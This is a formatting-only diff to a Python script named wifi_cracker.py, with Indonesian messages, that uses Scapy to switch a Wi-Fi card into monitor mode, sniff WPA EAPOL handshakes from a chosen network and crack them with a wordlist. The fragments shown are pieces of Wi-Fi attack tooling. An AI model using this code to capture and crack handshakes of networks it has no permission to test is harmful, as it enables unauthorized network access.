@@ -23,9 +23,20 @@ from pathlib import Path
 
 try:
     from scapy.all import (
-        RadioTap, Dot11, Dot11Beacon, Dot11ProbeReq, Dot11ProbeResp,
-        Dot11Elt, Dot11Auth, Dot11AssoReq, Dot11AssoResp,
-        EAPOL, sniff, wrpcap, rdpcap, conf
+        RadioTap,
+        Dot11,
+        Dot11Beacon,
+        Dot11ProbeReq,
+        Dot11ProbeResp,
+        Dot11Elt,
+        Dot11Auth,
+        Dot11AssoReq,
+        Dot11AssoResp,
+        EAPOL,
+        sniff,
+        wrpcap,
+        rdpcap,
+        conf,
     )
 except ImportError:
     sys.exit("[!] Scapy tidak terinstall. Install dengan: pip install scapy")
@@ -33,8 +44,11 @@ except ImportError:
 STOP_EVENT = Event()
 HANDSHAKE_CAPTURED = Event()
 captured_handshake = {
-    "bssid": None, "essid": None, "channel": None,
-    "encryption": None, "packets": []
+    "bssid": None,
+    "essid": None,
+    "channel": None,
+    "encryption": None,
+    "packets": [],
 }
 
 
@@ -57,7 +71,9 @@ def enable_monitor_mode(iface: str) -> str:
     except Exception:
         pass
     try:
-        subprocess.run(["iw", "dev", iface, "set", "type", "monitor"], capture_output=True, check=True)
+        subprocess.run(
+            ["iw", "dev", iface, "set", "type", "monitor"], capture_output=True, check=True
+        )
         subprocess.run(["ip", "link", "set", iface, "up"], capture_output=True, check=True)
         print(f"[+] Interface {iface} diubah ke monitor mode.")
         return iface
@@ -180,8 +196,10 @@ class HandshakeSniffer:
             self.packets.append(pkt)
             print(f"\n[+] Paket EAPOL #{self.eapol_count[client_mac]} dari {client_mac}")
             frames_needed = {1, 2, 3, 4}
-            if frames_needed.issubset(set(range(1, self.eapol_count[client_mac] + 1))) or \
-               self.eapol_count[client_mac] >= 4:
+            if (
+                frames_needed.issubset(set(range(1, self.eapol_count[client_mac] + 1)))
+                or self.eapol_count[client_mac] >= 4
+            ):
                 HANDSHAKE_CAPTURED.set()
                 if self.essid_filter and self.bssid:
                     captured_handshake["bssid"] = self.bssid
@@ -226,9 +244,13 @@ def capture_mode(args):
     print(f"\n[*] Menunggu WPA handshake... (Ctrl+C untuk berhenti)")
 
     try:
-        sniff(iface=mon_iface, prn=sniffer.packet_handler, store=False,
-              timeout=args.timeout if args.timeout > 0 else None,
-              stop_filter=lambda x: STOP_EVENT.is_set() or HANDSHAKE_CAPTURED.is_set())
+        sniff(
+            iface=mon_iface,
+            prn=sniffer.packet_handler,
+            store=False,
+            timeout=args.timeout if args.timeout > 0 else None,
+            stop_filter=lambda x: STOP_EVENT.is_set() or HANDSHAKE_CAPTURED.is_set(),
+        )
     except Exception as e:
         print(f"[!] Error saat sniffing: {e}")
 
@@ -338,15 +360,20 @@ Contoh:
   python wifi_cracker.py --mode full --iface wlan0 --essid "MyWiFi" --wordlist rockyou.txt
         """,
     )
-    parser.add_argument("--mode", required=True, choices=["capture", "crack", "full"],
-                        help="Mode operasi: capture, crack, atau full")
+    parser.add_argument(
+        "--mode",
+        required=True,
+        choices=["capture", "crack", "full"],
+        help="Mode operasi: capture, crack, atau full",
+    )
     parser.add_argument("--iface", help="Interface WiFi (contoh: wlan0)")
     parser.add_argument("--essid", help="Filter ESSID target")
     parser.add_argument("--output", help="File output PCAP untuk handshake")
     parser.add_argument("--pcap", help="File PCAP untuk cracking")
     parser.add_argument("--wordlist", help="File wordlist untuk cracking")
-    parser.add_argument("--timeout", type=int, default=0,
-                        help="Timeout capture dalam detik (0 = tanpa timeout)")
+    parser.add_argument(
+        "--timeout", type=int, default=0, help="Timeout capture dalam detik (0 = tanpa timeout)"
+    )
     args = parser.parse_args()
 
     if args.mode in ("capture", "full") and not args.iface:
